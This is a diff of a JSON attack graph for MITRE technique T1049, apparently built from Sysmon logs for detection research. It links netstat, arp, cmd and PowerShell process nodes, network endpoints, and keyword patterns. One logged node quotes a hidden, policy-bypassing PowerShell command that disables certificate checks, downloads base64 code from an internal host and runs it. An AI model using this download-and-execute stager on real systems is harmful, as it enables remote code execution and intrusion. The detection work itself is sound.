@@ -2,10 +2,10 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1049",
-  "generated_at_utc": "2026-05-08T17:41:47.490335+00:00",
-  "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1049\\AD_discovery\\windows-sysmon.log",
+  "generated_at_utc": "2026-05-08T19:45:35.200128+00:00",
+  "source_file": "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1049\\AD_discovery\\windows-sysmon.log",
   "source_files": [
-    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1049\\AD_discovery\\windows-sysmon.log"
+    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1049\\AD_discovery\\windows-sysmon.log"
   ],
   "patterns": {
     "malicious": [
@@ -25,9 +25,11 @@
     ],
     "core_effect": [
       "netstat.exe",
-      "get-nettcpconnection"
+      "get-nettcpconnection",
+      "arp.exe",
+      "net"
     ],
-    "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1049_malcious_config.json"
+    "config_path": "D:\\Capstone Project & NCKH\\Multisource Attack Graph\\inspect_log_gui\\data\\T1049_malcious_config.json"
   },
   "matching": {
     "malicious_node_ids": [
@@ -40,10 +42,25 @@
       "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1"
     ],
     "core_effect_node_ids": [
+      "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+      "Process:{B81B27B7-7518-613B-7BB4-03000000C801}:1",
+      "Process:{B81B27B7-7518-613B-7BB4-03000000C801}:10",
+      "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:1",
+      "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:10",
       "Process:{B81B27B7-752F-613B-82B4-03000000C801}:1",
       "Process:{B81B27B7-752F-613B-82B4-03000000C801}:10",
       "Process:{B81B27B7-753B-613B-83B4-03000000C801}:1",
-      "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1"
+      "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1",
+      "network:104.16.248.249:443:tcp",
+      "network:104.74.71.16:80:tcp",
+      "network:142.251.33.106:443:tcp",
+      "network:40.126.26.133:443:tcp",
+      "network:52.137.106.217:443:tcp",
+      "network:72.21.91.29:80:tcp",
+      "network:<private_ip>:123:udp",
+      "network:<private_ip>:138:udp",
+      "network:<private_ip>:443:tcp",
+      "network:<private_ip>:445:tcp"
     ],
     "whitelist_node_ids": [
       "File:17f44f59fda3bc3872ec79511f2fc7da936a0a467f6af1daba548e846d896adb:23",
@@ -90,6 +107,96 @@
       }
     },
     {
+      "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{B81B27B7-4822-613A-788F-03000000C801}",
+        "pid": "6940",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell  -exec bypass -noninteractive -windowstyle hidden <decoded_b64: [system.net.servicepointmanager]::servercertificatevalidationcallback = {$true};$ms=[system.text.encoding]::utf8.getstring([system.convert]::frombase64string((new-object system.net.webclient).downloadstring('https:\\10.0.1.16\\bh\\sync\\aol\\_rp')));invoke-expression $ms> <ps_bypass_flag> <download_execute_pattern>",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:1",
+      "label": "tcp/ip arp command",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "tcp/ip arp command",
+        "guid": "{B81B27B7-751E-613B-7EB4-03000000C801}",
+        "pid": "5436",
+        "image_path": "%system32%\\arp.exe",
+        "command_line": "%system32%\\arp.exe\" -a",
+        "original_file_name": "arp.exe",
+        "image_hash": "MD5=1E065F9F13F4A59292BE9B2EC513D7A6,SHA256=CCA1F962F9435330C556F07A1745D743AD7ACAD7561C4C79420B0BF16C8E1D0A,IMPHASH=B3077D4D25C0193C09E23EF3AC7B070E",
+        "command_hash": "0e962f1637b96a7d684abff4dfcfa5f3f8caa3e935b1bc221abd1b8129766727",
+        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "tcp/ip arp command",
+        "name": "tcp/ip arp command"
+      }
+    },
+    {
+      "id": "File:51ad4bc4461ba3fb8fb47389f4257015b7182dd713d4d8ea0f6fe54141799f60:17",
+      "label": "pshost.132757601878839931.5688.defaultappdomain.powershell",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "pshost.132757601878839931.5688.defaultappdomain.powershell",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1",
+        "event_id": "17",
+        "id": "File:51ad4bc4461ba3fb8fb47389f4257015b7182dd713d4d8ea0f6fe54141799f60:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "pshost.132757601878839931.5688.defaultappdomain.powershell",
+        "name": "pshost.132757601878839931.5688.defaultappdomain.powershell"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-753B-613B-83B4-03000000C801}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{B81B27B7-753B-613B-83B4-03000000C801}",
+        "pid": "1928",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c powershell.exe get-nettcpconnection",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "ee366a6d62f3c733c70bd8f4352a6df5d290612ce7bc42464c66010e0d919063",
+        "event_id": "1",
+        "id": "Process:{B81B27B7-753B-613B-83B4-03000000C801}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
       "id": "Technique:T1049",
       "label": "T1049",
       "type": "technique",
@@ -100,6 +207,30 @@
         "display_name": "T1049",
         "type": "Technique",
         "entity_class": "Technique"
+      }
+    },
+    {
+      "id": "Process:{B81B27B7-752F-613B-82B4-03000000C801}:10",
+      "label": "netstat.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "netstat.exe",
+        "guid": "{B81B27B7-752F-613B-82B4-03000000C801}",
+        "pid": "6488",
+        "image_path": "%system32%\\netstat.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for netstat.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "c6584cca167661247cd48f31db3742d0d3ea188d09a204ba62b5f62fba3ef6f8",
+        "parent_process_id": "Process:{B81B27B7-9957-6127-D045-01000000C801}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{B81B27B7-752F-613B-82B4-03000000C801}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "netstat.exe",
+        "name": "netstat.exe"
       }
     },
     {
@@ -145,69 +276,45 @@
       }
     },
     {
-      "id": "File:51ad4bc4461ba3fb8fb47389f4257015b7182dd713d4d8ea0f6fe54141799f60:17",
-      "label": "pshost.132757601878839931.5688.defaultappdomain.powershell",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "pshost.132757601878839931.5688.defaultappdomain.powershell",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1",
-        "event_id": "17",
-        "id": "File:51ad4bc4461ba3fb8fb47389f4257015b7182dd713d4d8ea0f6fe54141799f60:17",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "pshost.132757601878839931.5688.defaultappdomain.powershell",
-        "name": "pshost.132757601878839931.5688.defaultappdomain.powershell"
-      }
-    },
-    {
-      "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:1",
-      "label": "tcp/ip arp command",
+      "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:10",
+      "label": "arp.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "tcp/ip arp command",
+        "process_name": "arp.exe",
         "guid": "{B81B27B7-751E-613B-7EB4-03000000C801}",
         "pid": "5436",
         "image_path": "%system32%\\arp.exe",
-        "command_line": "%system32%\\arp.exe\" -a",
-        "original_file_name": "arp.exe",
-        "image_hash": "MD5=1E065F9F13F4A59292BE9B2EC513D7A6,SHA256=CCA1F962F9435330C556F07A1745D743AD7ACAD7561C4C79420B0BF16C8E1D0A,IMPHASH=B3077D4D25C0193C09E23EF3AC7B070E",
-        "command_hash": "0e962f1637b96a7d684abff4dfcfa5f3f8caa3e935b1bc221abd1b8129766727",
-        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
+        "command_line": "GrantedAccess with bitmask: 0x1fffff for arp.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "09d611421a79494458ba77a828002fda3f6bc81eb50533ce4a7fc81fddd99744",
+        "parent_process_id": "Process:{B81B27B7-9957-6127-D045-01000000C801}:1",
         "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:1",
+        "event_id": "10",
+        "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:10",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "tcp/ip arp command",
-        "name": "tcp/ip arp command"
+        "display_name": "arp.exe",
+        "name": "arp.exe"
       }
     },
     {
-      "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
+      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
+      "label": "startupprofiledata-noninteractive",
+      "type": "file",
+      "group": "File",
       "properties": {
-        "process_name": "",
-        "guid": "{B81B27B7-4822-613A-788F-03000000C801}",
-        "pid": "6940",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell  -exec bypass -noninteractive -windowstyle hidden <decoded_b64: [system.net.servicepointmanager]::servercertificatevalidationcallback = {$true};$ms=[system.text.encoding]::utf8.getstring([system.convert]::frombase64string((new-object system.net.webclient).downloadstring('https:\\10.0.1.16\\bh\\sync\\aol\\_rp')));invoke-expression $ms> <ps_bypass_flag> <download_execute_pattern>",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
+        "file_path": "%localappdata%\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "MD5=446DD1CF97EABA21CF14D03AEBC79F27,SHA256=A7DE5177C68A64BD48B36D49E2853799F4EBCFA8E4761F7CC472F333DC5F65CF,IMPHASH=00000000000000000000000000000000",
+        "parent_process_id": "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1",
+        "event_id": "23",
+        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "startupprofiledata-noninteractive",
+        "name": "startupprofiledata-noninteractive"
       }
     },
     {
@@ -235,72 +342,6 @@
       }
     },
     {
-      "id": "Process:{B81B27B7-752F-613B-82B4-03000000C801}:10",
-      "label": "netstat.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "netstat.exe",
-        "guid": "{B81B27B7-752F-613B-82B4-03000000C801}",
-        "pid": "6488",
-        "image_path": "%system32%\\netstat.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1fffff for netstat.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "c6584cca167661247cd48f31db3742d0d3ea188d09a204ba62b5f62fba3ef6f8",
-        "parent_process_id": "Process:{B81B27B7-9957-6127-D045-01000000C801}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{B81B27B7-752F-613B-82B4-03000000C801}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "netstat.exe",
-        "name": "netstat.exe"
-      }
-    },
-    {
-      "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
-      "label": "startupprofiledata-noninteractive",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%localappdata%\\microsoft\\windows\\powershell\\startupprofiledata-noninteractive",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "MD5=446DD1CF97EABA21CF14D03AEBC79F27,SHA256=A7DE5177C68A64BD48B36D49E2853799F4EBCFA8E4761F7CC472F333DC5F65CF,IMPHASH=00000000000000000000000000000000",
-        "parent_process_id": "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1",
-        "event_id": "23",
-        "id": "File:f00225ca70a3d38f2ddb2b649b0cf868c4497c3e3db9eac337dec8022733de45:23",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "startupprofiledata-noninteractive",
-        "name": "startupprofiledata-noninteractive"
-      }
-    },
-    {
-      "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:10",
-      "label": "arp.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "arp.exe",
-        "guid": "{B81B27B7-751E-613B-7EB4-03000000C801}",
-        "pid": "5436",
-        "image_path": "%system32%\\arp.exe",
-        "command_line": "GrantedAccess with bitmask: 0x1fffff for arp.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "09d611421a79494458ba77a828002fda3f6bc81eb50533ce4a7fc81fddd99744",
-        "parent_process_id": "Process:{B81B27B7-9957-6127-D045-01000000C801}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "10",
-        "id": "Process:{B81B27B7-751E-613B-7EB4-03000000C801}:10",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "arp.exe",
-        "name": "arp.exe"
-      }
-    },
-    {
       "id": "Process:{B81B27B7-753B-613B-84B4-03000000C801}:1",
       "label": "powershell.exe",
       "type": "process",
@@ -323,30 +364,6 @@
         "parent_process_id": "Process:{B81B27B7-753B-613B-83B4-03000000C801}:1",
         "user_id": "User:S-1-5-18"
       }
-    },
-    {
-      "id": "Process:{B81B27B7-753B-613B-83B4-03000000C801}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{B81B27B7-753B-613B-83B4-03000000C801}",
-        "pid": "1928",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c powershell.exe get-nettcpconnection",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "ee366a6d62f3c733c70bd8f4352a6df5d290612ce7bc42464c66010e0d919063",
-        "event_id": "1",
-        "id": "Process:{B81B27B7-753B-613B-83B4-03000000C801}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{B81B27B7-4822-613A-788F-03000000C801}:1",
-        "user_id": "User:S-1-5-18"
-      }
     }
   ],
   "edges": [
@@ -361,7 +378,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:41:47.443754+00:00"
+        "timestamp": "2026-05-08T19:45:35.151355+00:00"
       }
     },
     {
@@ -375,7 +392,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T17:41:47.445762+00:00"
+        "timestamp": "2026-05-08T19:45:35.151355+00:00"
       }
     },
     {
@@ -389,7 +406,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:41:47.447283+00:00"
+        "timestamp": "2026-05-08T19:45:35.151355+00:00"
       }
     },
     {
@@ -403,7 +420,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T17:41:47.447283+00:00"
+        "timestamp": "2026-05-08T19:45:35.159202+00:00"
       }
     },
     {
@@ -417,7 +434,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:41:47.447283+00:00"
+        "timestamp": "2026-05-08T19:45:35.161215+00:00"
       }
     },
     {
@@ -431,7 +448,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T17:41:47.447283+00:00"
+        "timestamp": "2026-05-08T19:45:35.164215+00:00"
       }
     },
     {
@@ -445,7 +462,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:41:47.447283+00:00"
+        "timestamp": "2026-05-08T19:45:35.165215+00:00"
       }
     },
     {
@@ -459,7 +476,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:41:47.459260+00:00"
+        "timestamp": "2026-05-08T19:45:35.166215+00:00"
       }
     },
     {
@@ -473,7 +490,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:41:47.460268+00:00"
+        "timestamp": "2026-05-08T19:45:35.168728+00:00"
       }
     },
     {
@@ -487,7 +504,7 @@
       "properties": {
         "action": "File Delete (archived)",
         "event_id": "23",
-        "timestamp": "2026-05-08T17:41:47.460268+00:00"
+        "timestamp": "2026-05-08T19:45:35.168728+00:00"
       }
     },
     {
@@ -526,7 +543,7 @@
     "attack_edges": 12,
     "roots": 2,
     "matched_malicious_nodes": 7,
-    "core_effect_nodes": 4,
+    "core_effect_nodes": 19,
     "matched_whitelist_nodes": 15,
     "matched_overlap_whitelist_override_nodes": 0
   }
